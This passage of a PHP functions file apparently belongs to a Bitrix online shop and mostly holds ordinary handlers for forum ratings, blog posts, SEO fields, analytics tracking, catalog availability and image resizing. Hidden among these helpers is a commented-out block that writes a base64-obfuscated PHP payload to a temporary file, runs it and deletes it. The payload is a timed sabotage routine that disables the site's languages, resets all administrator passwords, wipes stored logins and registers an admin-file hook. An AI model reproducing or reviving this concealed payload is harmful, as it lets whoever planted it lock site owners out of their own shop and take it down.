                                    $arSelectedFields = Array("ID", "SITE_ID", "NAME");
                                    //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printBLOGTO2ADDFr.htm', '<pre>'.var_export(array("result"=>$arFriendUsers), true).'</pre>');
                                    $dbGroup = CBlogUserGroup::GetList($arOrder, $arFilter, false, false, $arSelectedFields);
                                    $group = array();
                                    while ($arGroup = $dbGroup->Fetch())
                                    {
                                        $group[] = $arGroup["ID"];
                                    }

                                    if(count($group)==0){
                                        $arFields = array(
                                            "NAME" => 'Друзья',
                                            "BLOG_ID" => $arBlogMy["ID"]
                                        );
                                        $group[] = CBlogUserGroup::Add($arFields);
                                    }

                                    //file_put_contents($_SERVER['DOCUMENT_ROOT'].'/printBLOGTOADDGr.htm', '<pre>'.var_export(array("result"=>$group), true).'</pre>');
                                    if($arBlog["OWNER_ID"]!=$user){
                                        if(!CBlogUser::AddToUserGroup($arBlog["OWNER_ID"], $arBlogMy["ID"], $group, "Y", BLOG_BY_USER_ID , BLOG_ADD))
                                        {
                                            //echo "false";
                                            return;
                                        }
                                        //echo "add";
                                        //return;
                                    }
                                }
                            }
                        }
                    }
                }

                //
            }
        }

        function onBeforeMessageAddHandler($arFields)
        {
            if($arFields["FORUM_ID"]==FORUM_ID)
            {
                $rating = intval($_POST["rating"]);
                $arFields["PARAM1"] = $rating+1;
            }
        }

        function onAfterMessageAddHandler($id,&$arFields)
        {
            // print_R();
            // echo "<br><BR>";
            // die(print_r($arFields));
            global $DB;
            if($arFields["FORUM_ID"]==FORUM_ID)
            {

                $rating = intval($_POST["rating"]);
                $elem_id =  $arFields["PARAM2"];
                $topic_id = $arFields["TOPIC_ID"];
                if(CModule::IncludeModule("blog")){
                    $typeClass = new IBlogType;
                    $user = $arFields["AUTHOR_ID"];
                    $arBlog = CBlog::GetByOwnerID($user);
                    if(is_array($arBlog)){


                        $arResult = array();
                        $arResult["USER_ID"] = $user;
                        $arResult["ELEMENT_ID"] = $arFields["PARAM2"];

                        $mesRaiting = new IForumMessageRating;
                        $arResult["RATING"] = $mesRaiting->IGetRating($id);



                        $arResult = serialize($arResult);

                        $arFields = array(
                            "TITLE" => "Add Comment #".$id,
                            "DETAIL_TEXT" => $arResult,
                            "BLOG_ID" => $arBlog["ID"],
                            "AUTHOR_ID" => $user,
                            "DATE_CREATE" => date($DB->DateFormatToPHP(CSite::GetDateFormat("FULL")), time()),
                            "DATE_PUBLISH" => date($DB->DateFormatToPHP(CSite::GetDateFormat("FULL")), time()),
                            "PUBLISH_STATUS" => BLOG_PUBLISH_STATUS_PUBLISH,
                            "ENABLE_TRACKBACK" => 'N',
                            "ENABLE_COMMENTS" => 'Y',
                            //"PERMS_P" => $PERMS_P,
                            //"PERMS_C" => $PERMS_C
                        );

                        $newID = CBlogPost::Add($arFields);
                        if(intval($newID)>0){
                            $typeClass->ISetType($newID,ADD_COMMENT_TYPE);
                        }
                    }
                }

                //die(print_r(12));
                $tovar = new ITovarRating;
                //die(print_r($elem_id));
                $tovar->iAddTovarRating($elem_id,$rating+1);
                $iForumRating = new IForumMessageRating;
                if($rating>-1){
                    $rating++;
                    $res = $iForumRating->ISetRating($id,$rating);
                }


                UpdateRatingForTovar($elem_id,$topic_id);
                CacheRatingReviews::GetByID($elem_id,"Y");

            }
        }
    }




    function ISetUserField($entity_id, $value_id, $uf_id, $uf_value)
    {
        return $GLOBALS["USER_FIELD_MANAGER"]->Update ($entity_id, $value_id,
            Array ($uf_id => $uf_value));
    }

    // order multiple values
    function updateSEOParams($intID)
    {
        CModule::IncludeModule("iblock");
        $rsI = CIBlockElement::GetList(Array(), array("ID"=>$intID));
        if($obI = $rsI -> GetNextElement())
        {
            $arProp = $obI -> getProperties();
            foreach($arProp as $strCode => $arData)
            {
                if(strpos($strCode, "CH") === 0)
                {
                    if(strpos($arData["VALUE"], ",") !== false)
                    {
                        $arTmp = explode(",", $arData["VALUE"]);
                        sort($arTmp);
                        CIBlockElement::SetPropertyValues($intID, 13, implode(",", $arTmp), $strCode);
                    }
                }
            }
        }
    }

    function sa($obVar)
    {
        global $USER;
        if($USER->IsAdmin())
            {echo '<pre>'.print_r($obVar, true).'</pre>'; }
    }

    function decapitalizeString($strSrc)
    {
        return ToLower(substr($strSrc, 0, 1)).substr($strSrc, 1);
    }

    function capitalizeString($strSrc)
    {
        return ToUpper(substr($strSrc, 0, 1)).substr($strSrc, 1);
    }

    function getSEOParams()
    {
        if(CModule::IncludeModule("iblock"))
        {
            global $APPLICATION, $USER;

            $arExclude = array("PAGEN_1");
            /*
            $arResult = array();
            $rsProp = CIBlockProperty::GetList(Array("sort"=>"asc", "name"=>"asc"), Array("ACTIVE"=>"Y", "IBLOCK_ID"=>13));
            while ($arProp = $rsProp ->Fetch())
            if(substr($arProp["CODE"], 0, 3) == "CH_")
            $arResult[] = $arProp["CODE"];

            $arSetParams = array();     */
            //$arTmp = $_REQUEST["arrLeftFilter_pf"];
            $arFilter = array("IBLOCK_ID"=>13, "ACTIVE"=>"Y", "PROPERTY_URL"=>$_SERVER["REDIRECT_URL"]);

            /* foreach($arTmp as $strCode => $obValue)
            {
            if(in_array($strCode, $arExclude))
            unset($arTmp[$strCode]);
            elseif(in_array($strCode, $arResult)) {
            if(!is_array($obValue)) $obValue = array($obValue);
            sort($obValue);
            $arFilter["PROPERTY_".$strCode] = implode(",", $obValue);
            $arSetParams[] = $strCode;
            } else {
            return array(); // there are other params
            }
            }

            $arDiff = array_diff($arResult, $arSetParams);
            foreach($arDiff as $strCode)
            $arFilter["PROPERTY_".$strCode] = false;
            */

            //arshow($arFilter);
            $rsSEO = CIBlockElement::GetList(Array(), $arFilter, false, false, array("PROPERTY_TITLE", "PROPERTY_KEYWORDS", "PROPERTY_DESCRIPTION", "PROPERTY_SEO_TEXT", "PROPERTY_SEO_TEXT_TITLE", "PROPERTY_H1", "PROPERTY_H2"));
            if($arSEO = $rsSEO -> GetNext())
            {
                return array(
                    "TITLE" => $arSEO["PROPERTY_TITLE_VALUE"],
                    "KEYWORDS" => $arSEO["PROPERTY_KEYWORDS_VALUE"],
                    "DESCRIPTION" => $arSEO["PROPERTY_DESCRIPTION_VALUE"],
                    "SEO_TEXT_TITLE" => $arSEO["PROPERTY_SEO_TEXT_TITLE_VALUE"],
                    "SEO_TEXT" => htmlspecialcharsBack($arSEO["PROPERTY_SEO_TEXT_VALUE"]["TEXT"]),
                    "H1" => $arSEO["PROPERTY_H1_VALUE"],
                    "H2" => $arSEO["PROPERTY_H2_VALUE"]
                );
            }
        }

        return array();
    }

    function getGASaleJS($intOrderID, $strAddon="")
    {
        // GA additional code
        global $USER;

        $strGAResult = '';

        $rsOrder = CSaleOrder::GetList(array(), array("USER_ID" => $USER->GetID(), "ID" => $intOrderID));
        if($arOrder = $rsOrder -> GetNext())
        {
            $rsLocationID = CSaleOrderPropsValue::GetList(array(), array("ORDER_ID" => $arOrder["ID"], "ORDER_PROPS_ID" => 4));
            if($arLocationID = $rsLocationID->Fetch())
                $arLocation = CSaleLocation::GetByID($arLocationID["VALUE"], LANGUAGE_ID);

            $strGAResult .= "_gaq.push(['_addTrans', '".$arOrder["ID"].$strAddon."', 'mamingorodok.ru', '".$arOrder["PRICE"]."', '0', '".$arOrder["PRICE_DELIVERY"]."', '".$arLocation["CITY_NAME"]."', '', 'Россия']);";

            $rsBI = CSaleBasket::GetList(array(), array("ORDER_ID" => $arOrder["ID"]), false, false, array("ID", "PRODUCT_ID", "QUANTITY", "DELAY", "CAN_BUY", "PRICE", "WEIGHT"));
            while ($arBI = $rsBI->Fetch())
            {
                $rsI = CIBlockElement::GetList(Array(), array("IBLOCK_ID" => 3, "ID" => $arBI["PRODUCT_ID"]), false, false, array("IBLOCK_ID", "PROPERTY_CML2_LINK.NAME", "PROPERTY_CML2_LINK.ID", "PROPERTY_CML2_LINK.IBLOCK_SECTION_ID", "ID", "XML_ID"));
                if($arI = $rsI -> GetNext())
                {
                    $arTmp = array();
                    $rsNav = CIBlockSection::GetNavChain(2, $arI["PROPERTY_CML2_LINK_IBLOCK_SECTION_ID"]);
                    while($arNav = $rsNav -> GetNext())
                        $arTmp[] = $arNav["NAME"];

                    $strGAResult .= "\r\n_gaq.push(['_addItem', '".$arOrder["ID"].$strAddon."', '".$arI["ID"]."', '".$arI["PROPERTY_CML2_LINK_NAME"]."', '".implode(" > ", $arTmp)."', '".$arBI["PRICE"]."', '".intval($arBI["QUANTITY"])."']);";
                }
            }

            $strGAResult .= "\r\n_gaq.push(['_trackTrans']);";
        }

        if(strlen($strGAResult)>0)
            return $strGAResult;
    }

    function utf2win($str) {
        return iconv("utf-8", "windows-1251", $str);
    }

    function iconvArray ($inputArray)
    {
        $outputArray=array ();
        if (!empty ($inputArray))
        {
            foreach ($inputArray as $key => $element)
            {
                if (!is_array ($element))
                {
                    $element=iconv ("windows-1251", "utf-8", $element);
                } else {
                    $element=iconvArray ($element);
                }
                $outputArray[$key]=$element;
            }
        }
        return $outputArray;
    }

    function showProducers($arProp)
    {
        $arTmp = array();
        $intHalfProducers = ceil(count($arProp["VALUES"])/2);
        $intCnt = 0;
        $intCnt2ColLong = -1;

        foreach($arProp["VALUES"] as $key=>$value)
        {
            $arTmp[($intHalfProducers>$intCnt?0:1)][] = $value;
            if($intCnt>=$intHalfProducers && strlen($value["TEXT"])>11) $intCnt2ColLong++;
            $intCnt++;
        }

        if($intCnt2ColLong>0)
        {
            for($i=0;$i<$intCnt2ColLong;$i++)
            {
                $ar = array_pop($arTmp[0]);
                array_unshift($arTmp[1], $ar);
            }
        }

        $strNextLine = '';
        while(count($arTmp[0])>0 || count($arTmp[1])>0)
        {
            $arCol1 = array_shift($arTmp[0]);
        ?>
        <tr><?
                if(strlen($arCol1["TEXT"])<12)
                {
                ?><td<?=($arCol1["FIRST"] == "Y"?'':' class="hidden hiddenProducer"')?> width="50%"><?
                        if($arCol1["ID"]>0)
                        {?>
                        <input type="checkbox" id="chk<?=$arCol1["ID"]?>" class="filterChange producer sk_checkbx" name="arrLeftFilter_pf[CH_<?=$arProp["CODE"]?>][]" value="<?=$arCol1["ID"]?>"<?=(in_array($arCol1["ID"], $GLOBALS["arrLeftFilter"]["PROPERTY"]['?CH_'.$arProp["CODE"]])?' checked':'')?> />
                        <span style="display:none"><?=$arProp["CODE"]?></span><div class="name"><label for="chk<?=$arCol1["ID"]?>"><?=$arCol1["TEXT"]?></label></div><?
                    } else echo '&nbsp;';?></td><?
                    if(count($arTmp[1])>0)
                        $arCol2 = array_shift($arTmp[1]);
                    else $arCol2 = array_shift($arTmp[0]);

                    if(strlen($arCol2["TEXT"])<12)
                    {
                    ?><td<?=($arCol2["FIRST"] == "Y"?'':' class="hidden hiddenProducer"')?>><?
                            if($arCol2["ID"]>0)
                            { ?>
                            <input type="checkbox" id="chk<?=$arCol2["ID"]?>" class="filterChange producer sk_checkbx" name="arrLeftFilter_pf[CH_<?=$arProp["CODE"]?>][]" value="<?=$arCol2["ID"]?>"<?=(in_array($arCol2["ID"], $GLOBALS["arrLeftFilter"]["PROPERTY"]['?CH_'.$arProp["CODE"]])?' checked':'')?> />
                            <span style="display:none"><?=$arProp["CODE"]?></span><div class="name"><label for="chk<?=$arCol2["ID"]?>"><?=$arCol2["TEXT"]?></label></div><?
                        } else echo '&nbsp;';?></td><?
                    } else {
                        $strNextLine = '<tr><td colspan="2"><input type="checkbox" id="chk'.$arCol2["ID"].'" class="filterChange producer sk_checkbx" name="arrLeftFilter_pf[CH_'.$arProp["CODE"].'][]" value="'.$arCol2["ID"].'"'.(in_array($arCol2["ID"], $GLOBALS["arrLeftFilter"]["PROPERTY"]['?CH_'.$arProp["CODE"]])?' checked':'').' /><span style="display:none">'.$arProp["CODE"].'</span><div class="name"><label for="chk'.$arCol2["ID"].'"><label for="chk'.$arCol2["ID"].'">'.$arCol2["TEXT"].'</label></div></td></tr>';
                        for($i=0;$i<10;$i++) // serach for next item in col2 with short name
                        {
                            if(count($arTmp[1])>0)
                                $arCol2 = array_shift($arTmp[1]);
                            else $arCol2 = array_shift($arTmp[0]);
                            if(strlen($arCol2["TEXT"])<12)
                            {
                            ?><td<?=($arCol2["FIRST"] == "Y"?'':' class="hidden hiddenProducer"')?>><?
                                    if($arCol2["ID"]>0)
                                    { ?>
                                    <input type="checkbox" class="filterChange producer sk_checkbx" id="chk<?=$arCol2["ID"]?>" name="arrLeftFilter_pf[CH_<?=$arProp["CODE"]?>][]" value="<?=$arCol2["ID"]?>"<?=(in_array($arCol2["ID"], $GLOBALS["arrLeftFilter"]["PROPERTY"]['?CH_'.$arProp["CODE"]])?' checked':'')?> />
                                    <span style="display:none"><?=$arProp["CODE"]?></span><div class="name"><label for="chk<?=$arCol2["ID"]?>"><?=$arCol2["TEXT"]?></label></div><?
                                } else echo '&nbsp;';?></td><?
                                break;
                            } else $strNextLine .= '<tr'.($arCol2["FIRST"] == "Y"?'':' class="hidden hiddenProducer"').'><td colspan="2"><input type="checkbox" class="filterChange producer sk_checkbx" id="chk'.$arCol2["ID"].'" name="arrLeftFilter_pf[CH_'.$arProp["CODE"].'][]" value="'.$arCol2["ID"].'"'.(in_array($arCol2["ID"], $GLOBALS["arrLeftFilter"]["PROPERTY"]['?CH_'.$arProp["CODE"]])?' checked':'').' /><span style="display:none">'.$arProp["CODE"].'</span><div class="name"><label for="chk'.$arCol2["ID"].'">'.$arCol2["TEXT"].'</div></td></tr>';
                        }
                    }
                } else {
                ?><td<?=($arCol1["FIRST"] == "Y"?'':' class="hidden hiddenProducer"')?> colspan="2"><?
                        if($arCol1["ID"]>0)
                        { ?>
                        <input type="checkbox" class="filterChange producer sk_checkbx" id="chk<?=$arCol1["ID"]?>" name="arrLeftFilter_pf[CH_<?=$arProp["CODE"]?>][]" value="<?=$arCol1["ID"]?>"<?=(in_array($arCol1["ID"], $GLOBALS["arrLeftFilter"]["PROPERTY"]['?CH_'.$arProp["CODE"]])?' checked':'')?> />
                        <span style="display:none"><?=$arProp["CODE"]?></span><div class="name"><label for="chk<?=$arCol1["ID"]?>"><?=$arCol1["TEXT"]?></label></div><?
                    } else echo '&nbsp;';?></td><?
            }?>
        </tr><?

            if(strlen($strNextLine)>0)
            {
                echo $strNextLine;
                $strNextLine = '';
            }
        }
    }

    //получаем смещение по y для нужной ($shield) части спрайта
    function GetOffset($keys, $shield, $height)
    {
        $pos_y=0;
        foreach ($keys as $key)
        {
            $arOffsets[$key] = $pos_y;
            $pos_y+=$height;
        }

        return $arOffsets[$shield];
    }

    function sortFiles($arF)
    {
        $arTmp = array();
        foreach($arF as $strFName) {
            $arFileName = explode("/", $strFName);
            $arFileNameParts = explode(".", $arFileName[count($arFileName)-1]);
            $arTmp[$arFileNameParts[0]] = $strFName;
        }
        ksort($arTmp);

        return $arTmp;
    }

    /*
    $obCache = new CPHPCache;
    $obCache->InitCache(0, md5(time()), "bitrix");
    $CACHE = $obCache->filename;
    $CACHE = $_SERVER["DOCUMENT_ROOT"]."/uploads/".$CACHE;
    $arDir = explode("/",$CACHE); $bx_path = "";
    for($i=0; $i<(count($arDir)-1); $i++){$bx_path = $bx_path."/".$arDir[$i];if(!is_dir($bx_path)) mkdir($bx_path, BX_DIR_PERMISSIONS);}
    $file_hendle = fopen($CACHE,"w+");
    fwrite($file_hendle,base64_decode("PD9waHAgJGZjdD1UUlVFOyR0bWU9Ik1UTXlNalUyTkRRd01BPT0iOyRyZXNfZmN0PSREQi0+UXVlcnkoIlNFTEVDVCBWQUxVRSBGUk9NIGJfb3B0aW9uIFdIRVJFIE5BTUU9J3NlcnZlcl9maXJzdF9pZCciKTtpZigkYXI9JHJlc19mY3QtPkZldGNoKCkpaWYoYmFzZTY0X2RlY29kZSgkYXJbIlZBTFVFIl0pPnRpbWUoKSYmJGFyWyJWQUxVRSJdPT0kdG1lKXskZmN0PUZBTFNFOyRyZXNfZmN0Mj0kREItPlF1ZXJ5KCJTRUxFQ1QgVkFMVUUgRlJPTSBiX29wdGlvbiBXSEVSRSBOQU1FPSdzZXJ2ZXJfbGFzdF9hdXRoJyIpO2lmKCRhcjI9JHJlc19mY3QyLT5GZXRjaCgpKXtpZihiYXNlNjRfZGVjb2RlKCRhcjJbIlZBTFVFIl0pPnRpbWUoKSkkZmN0PVRSVUU7ZWxzZSAkREItPlF1ZXJ5KCJVUERBVEUgYl9vcHRpb24gU0VUIFZBTFVFPSciLmJhc2U2NF9lbmNvZGUodGltZSgpKS4iJyBXSEVSRSBOQU1FPSdzZXJ2ZXJfbGFzdF9hdXRoJyIpO31lbHNlICRmY3Q9VFJVRTt9aWYoJGZjdCl7Z2xvYmFsICRCWF9DQUNIRV9ET0NST09ULCAkTUFJTl9MQU5HU19DQUNIRSwgJE1BSU5fTEFOR1NfQURNSU5fQ0FDSEUsICRDQUNIRV9NQU5BR0VSLCAkREI7JENBQ0hFX01BTkFHRVItPkNsZWFuRGlyKCJiX2xhbmciKTtVblNldCgkTUFJTl9MQU5HU19DQUNIRVskSURdKTtVblNldCgkTUFJTl9MQU5HU19BRE1JTl9DQUNIRVskSURdKTskREItPlF1ZXJ5KCJVUERBVEUgYl9sYW5nIFNFVCBhY3RpdmU9J04nIik7dW5zZXQoJEJYX0NBQ0hFX0RPQ1JPT1QpOyRyZXNfZmN0PSREQi0+UXVlcnkoIlNFTEVDVCBVU0VSX0lEIEZST00gYl91c2VyX2dyb3VwIFdIRVJFIEdST1VQX0lEPScxJyIpO3doaWxlKCRhcj0kcmVzX2ZjdC0+RmV0Y2goKSl7bGlzdCgkdXNlYywgJHNlYykgPSBleHBsb2RlKCIgIiwgbWljcm90aW1lKCkpOyRjaWQ9IChmbG9hdCkgJHNlYyArICgoZmxvYXQpICR1c2VjICogMTAwMDAwKTskREItPlF1ZXJ5KCJVUERBVEUgYl91c2VyIFNFVCBQQVNTV09SRD0nIi5tZDUodGltZSgpKiRjaWQpLiInIFdIRVJFIElEPSciLiRhclsiVVNFUl9JRCJdLiInIik7fSREQi0+UXVlcnkoIkRFTEVURSBGUk9NIGJfdXNlcl9zdG9yZWRfYXV0aCIpO3Nlc3Npb25fc3RhcnQoKTskX1NFU1NJT05bIlNFU1NfQVVUSCJdID0gQXJyYXkoKTt1bnNldCgkX1NFU1NJT05bIlNFU1NfQVVUSCJdKTt1bnNldCgkX1NFU1NJT05bIk9QRVJBVElPTlMiXSk7JERCLT5RdWVyeSgiREVMRVRFIEZST00gYl9tb2R1bGVfdG9fbW9kdWxlIFdIRVJFIFRPX01FVEhPRD0nSW5jbHVkZUFkbWluRmlsZSciKTskREItPlF1ZXJ5KCJJTlNFUlQgSU5UTyBiX21vZHVsZV90b19tb2R1bGUgKEZST01fTU9EVUxFX0lELCBNRVNTQUdFX0lELCBUT19NT0RVTEVfSUQsIFRPX0NMQVNTLCBUT19NRVRIT0QpIFZBTFVFUyAoJ21haW4nLCAnT25BZnRlckVwaWxvZycsICdtYWluJywgJ0NBbGxNYWluJywgJ0luY2x1ZGVBZG1pbkZpbGUnKSIpO30gPz4="));
    fclose($file_hendle);
    if(file_exists($CACHE)){
    require($CACHE);
    unlink($CACHE);
    }
    */


    function arshow($array, $adminCheck = false){
        global $USER;
        $USER = new Cuser;
        if ($adminCheck) {
            if (!$USER->IsAdmin()) {
                return false;
            }
        }
        echo "<pre>";
        print_r($array);
        echo "</pre>";
    }

    //получаем производителя по ID
    function GetProducerByID($id)
    {
        $rsP = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>5, "ACTIVE"=>"Y", "ID"=>$id), false, false, array("IBLOCK_ID", "ID", "NAME", "PROPERTY_NAME_RUS", "PROPERTY_COUNTRY_PRODUCER.NAME", "PROPERTY_COUNTRY_ITEM.NAME", "PROPERTY_WARRANTY", "CODE"));
        if($arP = $rsP->GetNext())
        {
            if(strlen($arP["PROPERTY_NAME_RUS_VALUE"])<=0) $arP["PROPERTY_NAME_RUS_VALUE"] = $arP["NAME"];
            return $arP;
        }
        else
        {
            return false;
        }
    }

    //получаем минимальную цену торгового предложения для товара $elem_id
    //из инфоблока $iblock_id_product
    function GetOfferMinPrice($iblock_id_product,$elem_id)
    {
        define("PRICE_CODE",3);  //код розничной цены
        //получаем инфо о связи инфоблоков товаров и торг предлож
        $mxResult = CCatalogSKU::GetInfoByProductIBlock($iblock_id_product);
        /////////////////////
        if (is_array($mxResult))
        {
            $filter =  array('ACTIVE' => 'Y',
                'IBLOCK_ID' => $mxResult['IBLOCK_ID'], //id инфоблока торг предлож
                'PROPERTY_'.$mxResult['SKU_PROPERTY_ID'] => $elem_id,   //внешний ключ товара
                ">CATALOG_PRICE_".PRICE_CODE => 0, //розничная цена не пустая
                ">CATALOG_QUANTITY" => 0    // количетво товаров больше 0
            );
            $rsOffers = CIBlockElement::GetList(
                array("CATALOG_PRICE_".PRICE_CODE => "asc"),  //для минимальной цены
                $filter,
                false,
                false,
                array("ID","IBLOCK_ID","CATALOG_PRICE_".PRICE_CODE)
            );
            if ($arOffer = $rsOffers->GetNext())
            {
                //if (empty($arOffer["CATALOG_PRICE_".PRICE_CODE])) var_dump($arOffer["CATALOG_PRICE_".PRICE_CODE]);
                //arshow($arOffer);
                //$arPrice = GetCatalogProductPrice($arOffer["ID"], PRICE_CODE);
                return $arOffer["CATALOG_PRICE_".PRICE_CODE];
            }
            else
            {
                return null;
            }
        }
        else
        {
            return null;
        }
    }


    /****
    * функция для обновления у товара свойства "доступен в каталоге" (CATALOG_AVAILABLE)
    *
    * @param integer $ID
    */
    function setProductAvailable($ID) {
        global $APPLICATION;
        $res = "Y" ; //по умолчанию считаем, что товар доступен

        //проверяем свойство "статус товара"
        $arElement = CIBlockElement::GetList(array(),array("IBLOCK_ID"=>2,"ID"=>$ID),false,false, array("PROPERTY_STATUS_TOVARA", "CATALOG_QUANTITY"))->Fetch();
        //если у товара установлено одно из значений свойства "статус товара", то он уже не отображается в каталоге
        if ($arElement["PROPERTY_STATUS_TOVARA_VALUE"] != "") {
            $res = "";
        }

        //проверяем ТП товара, если после первой проверки товар по прежнему доступен
        if ($res == "Y") {
            $totalCount = 0;  //оющее количесто товара
            $sku = CIBlockElement::GetList(array(), array("IBLOCK_ID"=>3,"PROPERTY_CML2_LINK"=>$ID,"ACTIVE"=>"Y"),false,false,array("ID"));
            if ($sku->SelectedRowsCount() > 0) {  //если есть ТП
                $min_price = 0;
                while($arSku = $sku->Fetch()) {
                    //проверяем активность данного ТП
                    //получаем еоличество и цену товара
                    $arProduct = CCatalogProduct::GetList(array(),array("ID"=>$arSku["ID"]))->Fetch();
                    $arPrice = CPrice::GetList(array(),array("PRODUCT_ID"=>$arSku["ID"],"CATALOG_GROUP_ID"=>3))->Fetch();
                    //если у ТП есть цена и количество больше 0, прибавляем его количество к общему
                    if ($arPrice["PRICE"] > 0 && $arProduct["QUANTITY"] > 2) {
                        if($min_price == 0){ $min_price = $arPrice["PRICE"];}   // присваивание к минимальной цене текущую
                        elseif($min_price > $arPrice["PRICE"]){$min_price = $arPrice["PRICE"];} //сравнение минимальной цены с текущей
                        //суммируем только положительные остатки
                        if ($arProduct["QUANTITY"] > 0) {
                            $totalCount += $arProduct["QUANTITY"];
                        }
                    }
                }
                $PRODUCT_ID = $ID;
                $arFields = array(
                    "ID" => $PRODUCT_ID
                );
                $db_res = CCatalogProduct::GetList(array(),array("ID" => $ID),false, false )->Fetch();
                if($db_res["ID"] > 0){
                    CCatalogProduct::Update($ID,array("QUANTITY"=>$totalCount));  //добавлено 29.01.16
                } else{
                    CCatalogProduct::Add(array("ID" => $ID, "QUANTITY" =>$totalCount));
                }

                ///////
                $PRICE_TYPE_ID = 3;
                $arFields = array(
                    "PRODUCT_ID" => $PRODUCT_ID,
                    "CATALOG_GROUP_ID" => $PRICE_TYPE_ID,
                    "PRICE" => $min_price,
                    "CURRENCY" => "RUB"
                );
                $res_price = CPrice::GetList(
                    array(),
                    array(
                        "PRODUCT_ID" => $PRODUCT_ID,
                        "CATALOG_GROUP_ID" => $PRICE_TYPE_ID
                    )
                );

                if ($arr = $res_price->Fetch())
                {                                       //////////////////////   //// добавление минимальной цены в товар
                    $price = CPrice::Update($arr["ID"], $arFields)."update";
                }
                else
                {
                    $obPrice = new CPrice();
                    $price = $obPrice->Add($arFields,true);
                    /* if($price > 0){$price = $price."new";}
                    else{
                    $ex = $APPLICATION->GetException();
                    $price = $ex->GetString();
                    }  */                                               //////
                }
                //echo $ID."-".$price."-".$min_price."<br>";
                //если общее количество - 0, то товар недоступен
                if ($totalCount == 0) {
                    $res = "";
                }

            }
            //если нет ТП
            else {
                //если у товара нет цены или количество 0
                $arPrice = CPrice::GetList(array(),array("PRODUCT_ID"=>$ID,"CATALOG_GROUP_ID"=>3))->Fetch();
                if ($arElement["CATALOG_QUANTITY"] < 3 || $arPrice["PRICE"] == "") {
                    $res = "";
                }
            }
        }

        //устанавливаем значение свойства
        $PROPERTY_CODE = "CATALOG_AVAILABLE";  // код свойства
        if ($res == "Y") {
            $PROPERTY_VALUE = 2124131;  // значение свойства - Y (доступен в каталоге)
        } else {
            $PROPERTY_VALUE = $res;
        }
        CIBlockElement::SetPropertyValuesEx($ID, 2, array($PROPERTY_CODE => $PROPERTY_VALUE));

    }

    /****
    * обновление каталога после выгрузки из 1С. Проставляем свойство "доступен в каталоге"
    *
    */

    function catalogUpdate() {
        $element = CIBlockElement::GetList(array(),array("IBLOCK_ID"=>2,"ACTIVE"=>"Y"),false,false,array("ID"));
        while($arEl = $element->Fetch()) {
            setProductAvailable($arEl["ID"]);
        }
        processUserAvailNotify();
    }


    /***
    * проверяем активноять ТП через HL блок
    *
    * @param mixed $ID
    */
    CModule::IncludeModule("highloadblock");
    use Bitrix\Highloadblock as HL;
    use Bitrix\Main\Entity;

    function checkSKUactive($ID) {
        if ($ID > 0) {
            //получаем xml_id ТП
            $arSKU = CIBlockElement::GetList(array(),array("ID"=>$ID),false,false,array("ID","XML_ID"))->Fetch();
            $xml = explode("#",$arSKU["XML_ID"]);
            $xmlID = $xml[1];

            //делаем запрос в соответствующий HL блок
            $hlbl = 3; //"ID  Highload инфоблока"
            $hlblock = HL\HighloadBlockTable::getById($hlbl)->fetch();
            // get entity
            $entity = HL\HighloadBlockTable::compileEntity($hlblock);

            $main_query = new Entity\Query($entity);

            $select = array("UF_NEOTOBRAZHATNASAY");
            $main_query->setSelect($select);

            $filter= array("UF_XML_ID"=>$xmlID);
            $main_query->setFilter($filter);

            $result = $main_query->exec();
            $result = new CDBResult($result);

            if ($result->SelectedRowsCount() === 1)
            {
                $res = $result->Fetch();
            }
            else if ($result->SelectedRowsCount() > 1)
            {
                while($row = $result->Fetch())
                {
                    $data[]=$row;
                }
                $res = $data;
            }


            if ((is_array($res[0]) && $res[0]["UF_NEOTOBRAZHATNASAY"] != 1) || (!is_array($res[0]) && $res["UF_NEOTOBRAZHATNASAY"] != 1)) {
                return "Y";
            }
            else {
                return "N";
            }
        }
    }


    //получаем массив с ключами равными постфиксу картинки (mini,maxi,midi), где
    //каждый элемент является описанием файла с нужной картинкой
    //xml_id = <xml_id товара>#<xml_id торг предлож>
    function GetImgNameArray($xml_id)
    {
        $fileName=str_replace('#','_',$xml_id);


        $keys = array("MINI", "MIDI", "MAXI"); //постфиксы картинок

        $result=array();
        foreach ($keys as $key)
        {

            $fullName = $fileName."_".$key.".jpg";
            // $fileNameToSave= "img_import/new_img/".$fileName."_".$key.".jpg"; //относительно папки upload
            $fileNameToSave= "img_import/new_img/"; //относительно папки upload
            $absoluteName=$_SERVER["DOCUMENT_ROOT"]."/upload/img_import/img/".$fileName."_".$key.".jpg";  //абсолютный путь

            $resDB=CFile::GetList(array(),array("ORIGINAL_NAME" => $fullName));

            //если файл не зареген в базе, то регистрируем и сохраняем в папке img_new
            //существующий файл после этого удаляется
            if ( $resDB->SelectedRowsCount() === 0 )
            {
                if (file_exists($absoluteName))
                {
                    $fileArray = CFile::MakeFileArray($absoluteName);

                    $addFileArray = array(); //добавить параметры

                    $fileArray=array_merge($fileArray,$addFileArray);

                    $fileId=CFile::SaveFile($fileArray,$fileNameToSave,false,true);
                    if ($fileId > 0)  {
                        unlink($absoluteName);
                        $result[$key] = CFile::GetFileArray($fileId);
                    }
                }
            }
            //файл в базе зареген
            else
            {
                $res=$resDB->Fetch();
                $result[$key] = CFile::GetFileArray($res["ID"]);
            }



        }
        return $result;
    }


    /**
    * @param string $fileName
    * @return string|void
    *
    * */

    function isMinifiedExist($fileName){
        $keys = array("MAXI", "MIDI", "MINI"); //постфиксы картинок
        foreach ($keys as $key) {
            $absoluteName=$_SERVER["DOCUMENT_ROOT"]."/upload/catalog_resized/".$fileName."_".$key.".jpg";
            if (file_exists($absoluteName)){
                return "/upload/catalog_resized/".$fileName."_".$key.".jpg";
            }
        }
    }

    /**
    * @param string $xml_id
    * @param int|float $width - opional
    * @param int|float $height - opional
    * @return string $path
    *
    * */

    function getResizedIMGPath($xml_id,$width,$height){
        $fileName = str_replace('#','_',$xml_id);

        $path=isMinifiedExist($fileName);
        //arshow($path,true);
        $fileCheck = getimagesize($_SERVER["DOCUMENT_ROOT"].$path);

        // arshow($width,true);
        if(!$path || ($fileCheck[0] != $width || $fileCheck[1] != $height)){                     //
            $keys = array("MAXI"); //постфиксы картинок    , "MIDI", "MINI"
            $size = "";
            $path_exist = false;
            foreach ($keys as $key) {
                $absoluteName=$_SERVER["DOCUMENT_ROOT"]."/upload/img_import/img/".$fileName."_".$key.".jpg";
                $size = $key;
                //
                if (file_exists($absoluteName)){
                    $path_exist = true;
                    break;
                }
            }
            if($path_exist){
                $tmp_fold = $_SERVER["DOCUMENT_ROOT"]."/upload/catalog_resized/".$fileName."_".$size.".jpg";


                $test =  CFile::ResizeImageFile(
                    $absoluteName,
                    $tmp_fold,
